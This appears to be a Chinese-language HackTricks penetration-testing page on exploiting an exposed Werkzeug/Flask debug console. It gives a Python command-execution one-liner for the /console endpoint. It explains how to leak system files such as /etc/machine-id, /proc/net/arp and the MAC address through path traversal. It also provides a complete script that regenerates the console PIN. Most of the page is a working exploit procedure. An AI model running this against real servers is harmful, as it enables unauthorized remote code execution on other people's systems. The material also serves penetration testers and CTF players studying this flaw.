# Werkzeug / Flask 调试

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**即时可用的漏洞评估和渗透测试设置**。从任何地方运行完整的渗透测试，拥有 20 多个工具和功能，从侦察到报告。我们不替代渗透测试人员 - 我们开发定制工具、检测和利用模块，以便为他们节省时间，以便他们能够更深入地挖掘、弹出 shell，并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

## 控制台 RCE

如果调试处于活动状态，您可以尝试访问 `/console` 并获得 RCE。
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

互联网上也有几个像[这个](https://github.com/its-arun/Werkzeug-Debug-RCE)或者在metasploit中的漏洞。

## Pin保护 - 路径遍历

在某些情况下，**`/console`** 端点会被一个pin保护。如果你有一个**文件遍历漏洞**，你可以泄露所有生成该pin所需的信息。

### Werkzeug控制台PIN漏洞

**从第一个链接复制。**\
通过在应用程序中强制调试错误页面，查看Werkzeug“控制台锁定”消息。
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
在路径 `vulnerable-site.com/console` 上定位到存在漏洞的 Werkzeug 调试控制台，但它被一个秘密的 PIN 码锁定。

您可以反向工程生成控制台 PIN 的算法。检查服务器上的 Werkzeug 调试 `__init__.py` 文件，例如 `python3.5/site-packages/werkzeug/debug/__init__.py`。您可以查看[**Werkzeug 源代码仓库**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **来检查 PIN 是如何生成的**，但通过**文件遍历漏洞**泄露源代码更佳，因为版本可能有所不同。

利用控制台 PIN 需要的变量：
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** 是启动这个 Flask 的用户
* **`modname`** 是 flask.app
* `getattr(app, '__name__', getattr(app.__class__, '__name__'))` 是 **Flask**
* `getattr(mod, '__file__', None)` 是 flask 目录中 **`app.py` 的绝对路径**（例如：`/usr/local/lib/python3.5/dist-packages/flask/app.py`）。如果 `app.py` 不行，**尝试 `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` 是 **当前计算机的 MAC 地址**，`str(uuid.getnode())` 是 mac 地址的十进制表示。

* 要 **找到服务器 MAC 地址**，需要知道哪个 **网络接口被用来服务应用**（例如：`ens3`）。如果未知，**泄露 `/proc/net/arp`** 以获取设备 ID，然后在 **`/sys/class/net/<device id>/address`** **泄露** MAC 地址。

通过在 python 中运行将 **十六进制地址转换为十进制** 表示，例如：

```python
# 它是 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` 通过连接 **`/etc/machine-id`** 或 **`/proc/sys/kernel/random/boot_id`** 中的值与 **`/proc/self/cgroup`** 第一行最后的斜杠（`/`）后的内容。

<details>

<summary>get_machine_id() 代码</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

准备好所有变量后，运行利用脚本以生成 Werkzeug 控制台 PIN：
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
如果您使用的是Werkzeug的**旧版本**，尝试将**哈希算法更改为md5**而不是sha1。
{% endhint %}

## 参考资料

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**即时可用的漏洞评估和渗透测试设置**。使用20多个工具和功能从侦察到报告运行完整的渗透测试。我们不替代渗透测试人员 - 我们开发定制工具、检测和利用模块，以便他们有更多时间深入挖掘、弹出shell，并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
